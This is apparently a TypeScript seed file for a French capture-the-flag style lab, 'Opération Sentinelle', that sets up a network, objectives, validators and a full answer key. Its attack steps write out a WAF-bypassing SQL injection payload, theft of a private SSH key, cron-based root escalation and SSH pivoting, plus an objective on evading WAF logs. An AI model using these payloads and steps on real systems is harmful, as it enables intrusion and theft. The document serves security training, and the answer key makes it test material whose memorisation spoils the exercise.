import type { ProjectSeed } from "../../types";

/**
 * Projet « Opération Sentinelle » — checkpoint cybersecurite-projets.
 *
 * L'étudiant est consultant sécurité pour NovaBank : il configure une DMZ
 * (firewall nftables + WAF ModSecurity/CRS), puis l'audite lui-même via une
 * chaîne d'attaque complète (SQLi → foothold applicatif → privesc locale →
 * mouvement latéral SSH), puis analyse l'incident depuis un SIEM réel.
 *
 * NOTE SUR LES CHECKS DU FIREWALL (déviation assumée vs spec §7) :
 * l'isolation attacker→internal et waf→internal est déjà garantie par le
 * ROUTAGE (aucune route). Tester ces chemins passerait donc dès la baseline
 * permissive, et l'objectif 1 réussirait sans configuration. Pour rendre
 * l'objectif discriminant on ajoute au WAF une route vers `internal` (la règle
 * « seul webapp accède à 3306 » est ainsi testée par le FIREWALL), et on teste
 * attacker→waf:7681 (doit être fermé).
 *
 * DÉVIATIONS ASSUMÉES DE LA CHAÎNE (containers séparés vs write-up idéalisé) :
 *  - Foothold (obj 4) : `INTO OUTFILE` écrit sur le conteneur DB, pas sur
 *    webapp ; la RCE réelle sur webapp passe par la faille applicative DVWA
 *    (command injection / upload en sécurité « low »), atteinte À TRAVERS le
 *    WAF. La preuve serveur = empreinte SHA256 de la clé, écrite par l'étudiant
 *    via la RCE dans un fichier de preuve → prouve à la fois l'exécution de code
 *    ET la lecture de la clé.
 *  - Timestamp SSH latéral (obj 7) : capturé au niveau paquet par le firewall
 *    (tcpdump, robuste aux modifs nft de l'étudiant) et renvoyé au SIEM.
 *
 * FLAGS PAR SESSION : les valeurs `NOVA{...}` se terminent par `_{{SUFFIX}}` ;
 * le suffixe (FLAG_SUFFIX) est injecté par l'orchestrateur dans les conteneurs
 * et relu à la validation (jamais une constante recompilée).
 */

// Empreinte SHA256 de la clé privée backup-svc (id_rsa) embarquée dans l'image
// webapp — sert de preuve du foothold (obj 4). Recalculer si la clé est
// régénérée : `sha256sum project-sentinelle-webapp/id_rsa`.
const ID_RSA_SHA256 = "3bc5f89f656739f30b3d13cf8088aa7303ed236067e78717b9c6921736b16dcb";

export const operationSentinelle: ProjectSeed = {
  slug: "operation-sentinelle",
  checkpoint: "cybersecurite-projets",
  title: "Opération Sentinelle",
  description:
    "NovaBank te mandate pour sécuriser sa DMZ, puis t'engage comme pentester pour l'auditer toi-même : durcis le firewall et le WAF, puis enchaîne SQLi, foothold, élévation de privilèges et mouvement latéral — avant d'analyser l'incident depuis le SIEM.",
  difficulty: "hard",
  estimatedMinutes: 120,
  ttlSec: 9000,
  topology: {
    networks: [
      { name: "external", cidr: "10.10.0.0/24", internal: true },
      { name: "dmz", cidr: "10.20.0.0/24", internal: true },
      { name: "internal", cidr: "10.30.0.0/24", internal: true },
      { name: "mgmt", cidr: "10.40.0.0/24", internal: true },
    ],
    nodes: [
      {
        id: "attacker",
        image: "cyberace/attacker-base:latest",
        role: "attacker",
        terminal: true,
        networks: [{ name: "external", ip: "10.10.0.10" }],
        postStartRoutes: [{ network: "10.20.0.0/24", viaIp: "10.10.0.2" }],
        ports: [{ containerPort: 7681, label: "Terminal web (ttyd)", kind: "terminal" }],
        resources: { memMb: 192, cpu: 0.3 },
      },
      {
        id: "firewall",
        image: "cyberace/project-sentinelle-firewall:latest",
        role: "firewall",
        terminal: true,
        capAdd: ["NET_ADMIN"],
        sysctls: { "net.ipv4.ip_forward": "1" },
        env: { SIEM_IP: "10.40.0.50", FILESERVER_IP: "10.30.0.50" },
        networks: [
          { name: "external", ip: "10.10.0.2" },
          { name: "dmz", ip: "10.20.0.2" },
          { name: "internal", ip: "10.30.0.2" },
          { name: "mgmt", ip: "10.40.0.2" },
        ],
        ports: [{ containerPort: 7681, label: "Terminal web (ttyd)", kind: "terminal" }],
        resources: { memMb: 128, cpu: 0.3 },
      },
      {
        id: "waf",
        image: "cyberace/project-sentinelle-waf:latest",
        role: "waf",
        terminal: true,
        env: {
          BACKEND: "http://webapp:80",
          // L'image CRS tourne nginx en non-root : impossible de binder < 1024.
          PORT: "8080",
          MODSEC_RULE_ENGINE: "DetectionOnly",
          PARANOIA: "1",
          // access log dans un fichier → renvoyé au SIEM par l'entrypoint.
          ACCESSLOG: "/var/log/nginx/access.log",
          SIEM_IP: "10.40.0.50",
        },
        networks: [{ name: "dmz", ip: "10.20.0.20" }],
        // Routes : external (réponses attaquant), internal (test règle firewall),
        // mgmt (envoi des logs au SIEM).
        postStartRoutes: [
          { network: "10.10.0.0/24", viaIp: "10.20.0.2" },
          { network: "10.30.0.0/24", viaIp: "10.20.0.2" },
          { network: "10.40.0.0/24", viaIp: "10.20.0.2" },
        ],
        ports: [{ containerPort: 7681, label: "Terminal web (ttyd)", kind: "terminal" }],
        resources: { memMb: 256, cpu: 0.25 },
      },
      {
        id: "webapp",
        image: "cyberace/project-sentinelle-webapp:latest",
        role: "target",
        terminal: false,
        env: {
          DB_SERVER: "10.30.0.40",
          DB_DATABASE: "dvwa",
          DB_USER: "dvwa",
          DB_PASSWORD: "p@ssw0rd",
          DB_PORT: "3306",
          DEFAULT_SECURITY_LEVEL: "low",
        },
        networks: [{ name: "dmz", ip: "10.20.0.30" }],
        postStartRoutes: [{ network: "10.30.0.0/24", viaIp: "10.20.0.2" }],
        resources: { memMb: 320, cpu: 0.25 },
      },
      {
        id: "db",
        image: "cyberace/project-sentinelle-db:latest",
        role: "database",
        terminal: false,
        env: {
          MYSQL_ROOT_PASSWORD: "rootpw",
          MYSQL_DATABASE: "dvwa",
          MYSQL_USER: "dvwa",
          MYSQL_PASSWORD: "p@ssw0rd",
        },
        networks: [{ name: "internal", ip: "10.30.0.40" }],
        postStartRoutes: [{ network: "10.20.0.0/24", viaIp: "10.30.0.2" }],
        resources: { memMb: 768, cpu: 0.25 },
      },
      {
        id: "fileserver",
        image: "cyberace/project-sentinelle-fileserver:latest",
        role: "target",
        terminal: false,
        networks: [{ name: "internal", ip: "10.30.0.50" }],
        // Route retour vers la DMZ (réponses SSH vers webapp).
        postStartRoutes: [{ network: "10.20.0.0/24", viaIp: "10.30.0.2" }],
        resources: { memMb: 160, cpu: 0.2 },
      },
      {
        id: "siem",
        image: "cyberace/project-sentinelle-siem:latest",
        role: "log",
        terminal: true,
        networks: [{ name: "mgmt", ip: "10.40.0.50" }],
        ports: [{ containerPort: 7681, label: "Terminal web (ttyd)", kind: "terminal" }],
        resources: { memMb: 160, cpu: 0.2 },
      },
    ],
  },
  objectives: [
    {
      id: "firewall-dmz-policy",
      projectSlug: "operation-sentinelle",
      order: 1,
      kind: "defense",
      title: "Durcir le firewall (DMZ + mgmt)",
      hints: [
        { text: "Ouvre le terminal du firewall. `nft list ruleset` montre la policy de départ (accept partout).", cost: 0 },
        { text: "Passe la policy forward à `drop`, puis autorise UNIQUEMENT external→waf:8080 et webapp→db:3306, avec `ct state established,related accept` pour le retour.", cost: 0 },
        { text: "Autorise aussi le journal centralisé (udp 514 vers le SIEM 10.40.0.50), sinon l'analyse d'incident sera vide.", cost: 0 },
      ],
      description:
        "Configure nftables : policy forward à `drop`, puis n'autorise QUE external→dmz vers le WAF (8080), webapp (10.20.0.30)→internal:3306, et le journal centralisé waf→siem et firewall→siem en UDP 514 (réseau mgmt). Ajoute `ct state established,related accept` pour le retour. Tout le reste bloqué (y compris un autre hôte DMZ vers la base).",
      points: 150,
      validation: {
        strategy: "active_probe",
        spec: {
          checks: [
            { from: "attacker", to: "waf", port: 8080, expect: "open" },
            { from: "attacker", to: "waf", port: 7681, expect: "closed" },
            { from: "webapp", to: "db", port: 3306, expect: "open" },
            { from: "waf", to: "db", port: 3306, expect: "closed" },
          ],
        },
      },
    },
    {
      id: "waf-crs-activation",
      projectSlug: "operation-sentinelle",
      order: 2,
      kind: "defense",
      title: "Activer le WAF (ModSecurity/CRS)",
      hints: [
        { text: "Le WAF tourne en `DetectionOnly` : il détecte mais ne bloque rien.", cost: 0 },
        { text: "Édite /etc/modsecurity.d/modsecurity-override.conf et ajoute la ligne `SecRuleEngine On`.", cost: 0 },
        { text: "Recharge nginx (`nginx -s reload`) puis retente une injection : elle doit renvoyer 403.", cost: 0 },
      ],
      description:
        "Le WAF est en détection seule (rien n'est bloqué). Passe-le en blocage : ajoute `SecRuleEngine On` à /etc/modsecurity.d/modsecurity-override.conf puis `nginx -s reload`, pour filtrer les injections SQL basiques.",
      points: 150,
      validation: {
        strategy: "waf_probe",
        spec: {
          path: "/vulnerabilities/sqli/",
          testParam: "id",
          testPayload: "1' OR '1'='1",
          expectedStatus: 403,
          port: 8080,
        },
      },
    },
    {
      id: "sqli-bypass-exfil",
      projectSlug: "operation-sentinelle",
      order: 3,
      kind: "attack",
      title: "Contourner le WAF et exfiltrer (SQLi)",
      hints: [
        { text: "Connecte-toi à DVWA (admin/password), sécurité « low », page SQL Injection — le tout via le WAF (port 8080).", cost: 0 },
        { text: "Le filtre du WAF est naïf : un commentaire inline casse le motif `union select`. Essaie `UNION/**/SELECT`.", cost: 0 },
        { text: "Exfiltre la colonne `flag` de la table `secrets` : `1' UNION/**/SELECT flag,2 FROM secrets-- -`.", cost: 0 },
      ],
      description:
        "Le WAF est actif. Contourne-le (commentaires inline, casse, fragmentation — cf. cyber-pratique) pour exploiter la SQLi de webapp et récupérer le flag de la table `secrets`. Astuce : `UNION/**/SELECT`.",
      points: 300,
      dependsOn: ["firewall-dmz-policy", "waf-crs-activation"],
      validation: {
        strategy: "text_compare",
        spec: { kind: "flag", value: "NOVA{sqli_union_bypass_waf_exfil}_{{SUFFIX}}", caseSensitive: true },
      },
    },
    {
      id: "webapp-foothold",
      projectSlug: "operation-sentinelle",
      order: 4,
      kind: "attack",
      title: "Foothold applicatif sur webapp",
      hints: [
        { text: "En sécurité « low », DVWA expose une exécution de commande (page Command Injection).", cost: 0 },
        { text: "La clé SSH est mal protégée (644) : www-data peut la lire — `cat /var/www/.ssh/id_rsa`.", cost: 0 },
        { text: "Prouve ton accès : `sha256sum /var/www/.ssh/id_rsa > /var/www/html/hackable/uploads/foothold_proof.txt`.", cost: 0 },
      ],
      description:
        "Obtiens une exécution de commande sur webapp via la faille applicative DVWA (sécurité « low »), à travers le WAF. Lis la clé SSH mal protégée `/var/www/.ssh/id_rsa`, puis PROUVE ton accès : écris son empreinte dans le webroot avec `sha256sum /var/www/.ssh/id_rsa > /var/www/html/hackable/uploads/foothold_proof.txt`.",
      points: 250,
      dependsOn: ["sqli-bypass-exfil"],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "webapp",
          command: ["cat", "/var/www/html/hackable/uploads/foothold_proof.txt"],
          expectedContains: ID_RSA_SHA256,
        },
      },
    },
    {
      id: "webapp-privesc",
      projectSlug: "operation-sentinelle",
      order: 5,
      kind: "attack",
      title: "Élévation de privilèges locale (cron)",
      hints: [
        { text: "Cherche une tâche planifiée exécutée par root : `cat /etc/cron.d/novabank-backup`.", cost: 0 },
        { text: "Le script pointé est world-writable — vérifie `ls -l /usr/local/bin/backup.sh`.", cost: 0 },
        { text: "Ajoute `id > /tmp/root_proof.txt` au script, attends le prochain passage (≤ 1 min), puis lis `/root/local.txt`.", cost: 0 },
      ],
      description:
        "Une tâche cron root exécute un script world-writable (`/usr/local/bin/backup.sh`). Injecte-y une commande pour prouver l'exécution en root : `id > /tmp/root_proof.txt` (attends le prochain tick d'une minute), puis lis le flag `/root/local.txt`.",
      points: 250,
      dependsOn: ["webapp-foothold"],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "webapp",
          command: ["cat", "/tmp/root_proof.txt"],
          expectedContains: "uid=0(root)",
        },
      },
    },
    {
      id: "lateral-fileserver",
      projectSlug: "operation-sentinelle",
      order: 6,
      kind: "attack",
      title: "Mouvement latéral vers le fileserver",
      hints: [
        { text: "La clé récupérée est celle d'un compte de service (`backup-svc`) sur un hôte interne.", cost: 0 },
        { text: "ssh refuse une clé lisible par tous (0644) : copie-la puis `chmod 600` avant de l'utiliser.", cost: 0 },
        { text: "`ssh -i /tmp/k backup-svc@10.30.0.50` puis `cat documents/rapport-confidentiel.txt`.", cost: 0 },
      ],
      description:
        "Avec la clé `id_rsa` récupérée, rebondis depuis webapp en SSH : `ssh -i id_rsa backup-svc@10.30.0.50`. Lis `documents/rapport-confidentiel.txt` (flag mouvement latéral). Ta connexion acceptée est journalisée sur le fileserver.",
      points: 300,
      dependsOn: ["webapp-foothold"],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "fileserver",
          command: ["grep", "Accepted publickey for backup-svc", "/var/log/auth.log"],
          expectedContains: "Accepted publickey for backup-svc",
        },
      },
    },
    {
      id: "incident-forensics",
      projectSlug: "operation-sentinelle",
      order: 7,
      kind: "analysis",
      title: "Analyse d'incident (SIEM)",
      hints: [
        { text: "Ouvre le terminal du SIEM : les journaux sont dans /var/log/waf.log et /var/log/firewall.log.", cost: 0 },
        { text: "Requêtes bloquées = lignes 403 : `grep -c ' 403 ' /var/log/waf.log`. L'IP est le 1er champ après `waf:`.", cost: 0 },
        { text: "La connexion SSH latérale est taguée `SSH-LAT` dans firewall.log ; l'heure figure en tête de ligne.", cost: 0 },
      ],
      description:
        "Ouvre le terminal du SIEM. Les logs du WAF et du firewall y sont centralisés (`/var/log/waf.log`, `/var/log/firewall.log`). Réponds aux questions en `grep`/`wc -l` — les réponses n'existent QUE dans ces journaux.",
      points: 200,
      dependsOn: ["lateral-fileserver"],
      questions: [
        { id: "q1", prompt: "Combien de requêtes le WAF a-t-il bloquées (code 403) au total ? (nombre)" },
        { id: "q2", prompt: "Depuis quelle adresse IP la première requête bloquée a-t-elle été émise ?" },
        { id: "q3", prompt: "À quelle heure (HH:MM) la connexion SSH latérale vers le fileserver a-t-elle été détectée ?" },
      ],
      validation: {
        strategy: "log_forensics",
        spec: {
          questions: [
            {
              id: "q1",
              node: "siem",
              command: ["bash", "-c", "grep -c ' 403 ' /var/log/waf.log 2>/dev/null || echo 0"],
            },
            {
              id: "q2",
              node: "siem",
              command: ["bash", "-c", "grep ' 403 ' /var/log/waf.log 2>/dev/null | head -1"],
              extract: "waf:\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})",
            },
            {
              id: "q3",
              node: "siem",
              command: ["bash", "-c", "grep 'SSH-LAT' /var/log/firewall.log 2>/dev/null | head -1"],
              extract: "T(\\d{2}:\\d{2})",
            },
          ],
        },
      },
    },
    {
      id: "stealth-bonus",
      projectSlug: "operation-sentinelle",
      order: 8,
      kind: "attack",
      title: "Bonus : discrétion",
      hints: [
        { text: "Chaque requête bloquée par le WAF laisse une ligne 403 dans le SIEM.", cost: 0 },
        { text: "Un scanner automatique génère des dizaines de 403 : vise le contournement en ≤ 5 tentatives réfléchies.", cost: 0 },
      ],
      description:
        "Récompense un bypass réfléchi : au moment où tu valides, le WAF ne doit pas avoir bloqué plus de 5 requêtes (≤ 5 lignes 403 dans le SIEM). Évite le brute-force à l'aveugle.",
      points: 50,
      dependsOn: ["webapp-foothold"],
      validation: {
        strategy: "exec_check",
        spec: {
          node: "siem",
          command: [
            "bash",
            "-c",
            "c=$(grep -c ' 403 ' /var/log/waf.log 2>/dev/null || echo 0); if [ \"$c\" -le 5 ]; then echo STEALTH_OK; else echo NOISY_$c; fi",
          ],
          expectedContains: "STEALTH_OK",
        },
      },
    },
  ],
  solution: {
    summary:
      "Opération Sentinelle se joue en deux temps. D'abord la DÉFENSE : durcir le firewall (nftables, policy drop + autorisations minimales) et activer le WAF (SecRuleEngine On). Ensuite l'ATTAQUE, en chaîne : contourner le WAF pour exfiltrer par SQLi, obtenir un foothold applicatif sur webapp, élever ses privilèges via une tâche cron mal configurée, rebondir en SSH vers le fileserver interne, puis reconstituer l'incident depuis le SIEM.",
    steps: [
      {
        objectiveId: "firewall-dmz-policy",
        explanation:
          "Sur le terminal du firewall, on remplace la policy permissive par un `drop` par défaut et on n'autorise que les flux strictement nécessaires : external→WAF (8080), webapp→base (3306), le rebond SSH webapp→fileserver, et le journal vers le SIEM (udp 514). La règle `ct state established,related accept` laisse revenir les réponses.",
        commands: [
          "nft flush ruleset",
          "nft add table inet filter",
          "nft add chain inet filter forward '{ type filter hook forward priority 0 ; policy drop ; }'",
          "nft add rule inet filter forward ct state established,related accept",
          "nft add rule inet filter forward ip saddr 10.10.0.0/24 ip daddr 10.20.0.20 tcp dport 8080 accept",
          "nft add rule inet filter forward ip saddr 10.20.0.30 ip daddr 10.30.0.40 tcp dport 3306 accept",
          "nft add rule inet filter forward ip saddr 10.20.0.30 ip daddr 10.30.0.50 tcp dport 22 accept",
          "nft add rule inet filter forward ip daddr 10.40.0.50 udp dport 514 accept",
        ],
      },
      {
        objectiveId: "waf-crs-activation",
        explanation:
          "Le WAF démarre en détection seule. On l'active en blocage en ajoutant `SecRuleEngine On` à la configuration d'override, puis on recharge nginx. Une injection SQL basique renvoie alors 403.",
        commands: [
          "echo 'SecRuleEngine On' >> /etc/modsecurity.d/modsecurity-override.conf",
          "nginx -s reload",
          "# test : curl 'http://10.20.0.20:8080/vulnerabilities/sqli/?id=1%27+OR+%271%27=%271'  → 403",
        ],
      },
      {
        objectiveId: "sqli-bypass-exfil",
        explanation:
          "Le filtre du WAF est naïf (regex sur `union select`). Un commentaire inline `/**/` le contourne. Connecté à DVWA (admin/password, sécurité low), on exfiltre la colonne `flag` de la table `secrets` via une UNION commentée.",
        commands: [
          "# payload dans le champ id de /vulnerabilities/sqli/ :",
          "1' UNION/**/SELECT flag,2 FROM secrets-- -",
          "# → renvoie NOVA{sqli_union_bypass_waf_exfil}_<suffixe-de-session>",
        ],
        expectedLogs: "WAF (SIEM /var/log/waf.log) : les tentatives bloquées apparaissent en 403 ; la requête contournée passe en 200.",
      },
      {
        objectiveId: "webapp-foothold",
        explanation:
          "En sécurité low, DVWA permet l'exécution de commande (page Command Injection). On l'utilise pour lire la clé SSH mal protégée (644) de backup-svc, puis on écrit son empreinte dans le webroot comme preuve du foothold.",
        commands: [
          "# via la RCE applicative (à travers le WAF), en tant que www-data :",
          "cat /var/www/.ssh/id_rsa",
          "sha256sum /var/www/.ssh/id_rsa > /var/www/html/hackable/uploads/foothold_proof.txt",
        ],
      },
      {
        objectiveId: "webapp-privesc",
        explanation:
          "Une tâche cron root exécute chaque minute un script world-writable. On y injecte une commande pour prouver l'exécution en root, on attend un tick, puis on lit le flag root-only.",
        commands: [
          "cat /etc/cron.d/novabank-backup      # tâche root",
          "ls -l /usr/local/bin/backup.sh       # world-writable",
          "echo 'id > /tmp/root_proof.txt' >> /usr/local/bin/backup.sh",
          "sleep 60 ; cat /tmp/root_proof.txt   # uid=0(root)",
          "cat /root/local.txt                  # NOVA{privesc_cron_world_writable}_<suffixe>",
        ],
      },
      {
        objectiveId: "lateral-fileserver",
        explanation:
          "La clé récupérée ouvre le compte backup-svc sur le fileserver interne. ssh refusant une clé 0644, on la recopie en 600 avant le rebond, puis on lit le rapport confidentiel.",
        commands: [
          "cp /var/www/.ssh/id_rsa /tmp/k && chmod 600 /tmp/k",
          "ssh -i /tmp/k backup-svc@10.30.0.50 'cat documents/rapport-confidentiel.txt'",
          "# → NOVA{mouvement_lateral_ssh_pivot}_<suffixe>",
        ],
        expectedLogs: "Fileserver auth.log : « Accepted publickey for backup-svc ». Firewall (SIEM /var/log/firewall.log) : ligne SSH-LAT horodatée.",
      },
      {
        objectiveId: "incident-forensics",
        explanation:
          "Depuis le terminal du SIEM, on reconstitue l'incident à partir des journaux centralisés. Le nombre de blocages et l'IP de la première tentative viennent de waf.log ; l'heure du rebond SSH vient de firewall.log.",
        commands: [
          "grep -c ' 403 ' /var/log/waf.log                       # requêtes bloquées",
          "grep ' 403 ' /var/log/waf.log | head -1                # IP de la 1re tentative",
          "grep 'SSH-LAT' /var/log/firewall.log | head -1         # heure du mouvement latéral",
        ],
      },
      {
        objectiveId: "stealth-bonus",
        explanation:
          "La discrétion se mesure au bruit laissé sur le WAF : en contournant le filtre du premier coup plutôt qu'en le brute-forçant, on garde le compteur de 403 très bas (≤ 5) au moment de valider.",
        commands: [
          "grep -c ' 403 ' /var/log/waf.log   # doit rester ≤ 5",
        ],
      },
    ],
  },
};

export const allProjects: ProjectSeed[] = [operationSentinelle];
